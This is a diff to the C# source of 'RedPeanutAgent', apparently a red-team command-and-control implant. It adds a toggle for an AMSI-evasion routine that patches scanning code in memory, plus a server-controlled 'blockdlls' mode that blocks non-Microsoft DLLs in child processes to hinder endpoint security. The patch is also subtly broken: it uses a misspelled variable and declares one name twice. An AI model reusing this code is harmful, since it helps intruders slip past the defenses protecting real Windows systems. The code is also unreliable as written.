@@ -53,6 +53,9 @@ namespace RedPeanutAgent
         public bool injectionmanaged = bool.Parse("#MANAGED#");
         public string targetclass = "#TARGETCLASS#";
 
+        public bool blockdlls = false;
+        public bool amsievasion = true;
+
         public NamedPipeClientStream pipe;
         public Core.Utility.CookiedWebClient wc;
 
@@ -90,8 +93,11 @@ namespace RedPeanutAgent
 
         static byte[] x86 = new byte[8];
 
-        private static void Evade()
+        private static void Evade(bool evasion)
         {
+            if (!evasion)
+                return;
+
             if (is64Bit())
             {
                 x64[0] = 0xB8;
@@ -149,6 +155,7 @@ namespace RedPeanutAgent
 
         public void LoadAndRun(string[] arguments)
         {
+            Evade(amsievasion);
 
             string reasargs = string.Empty;
             foreach (string s in arguments)
@@ -270,8 +277,6 @@ namespace RedPeanutAgent
 
         public void Run()
         {
-            Evade();
-
             List<string> smblisteners = new List<string>();
 
             Random r = new Random();
@@ -316,7 +321,14 @@ namespace RedPeanutAgent
                                         }
                                         else
                                         {
-                                            commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModuleUnManaged));
+                                            if (blockdll)
+                                            {
+                                                commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModuleUnManagedBlockDll));
+                                            }
+                                            else
+                                            {
+                                                commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModuleUnManaged));
+                                            }
                                         }
                                         commandthread.Start();
                                     }
@@ -382,6 +394,14 @@ namespace RedPeanutAgent
                                     managed = task.InjectionManagedTask.Managed;
                                     Execution.CommandExecuter commandManaged = new Execution.CommandExecuter(task, this);
                                     commandManaged.SendResponse(string.Format("[*] Agent now in {0} mode", managed == true ? "Managed" : "Unmanaged"));
+                                    break;
+                                case "blockdlls":
+                                    blockdlls = task.BlockDlls.Block;
+                                    Execution.CommandExecuter commandManaged = new Execution.CommandExecuter(task, this);
+                                    if(blockdlls)
+                                        commandManaged.SendResponse("[*] Agent now block non Microsoft Dlls in child process");
+                                    else
+                                        commandManaged.SendResponse("[*] Agent now not block non Microsoft Dlls in child process");
                                     break;
                                 case "migrate":
                                     try
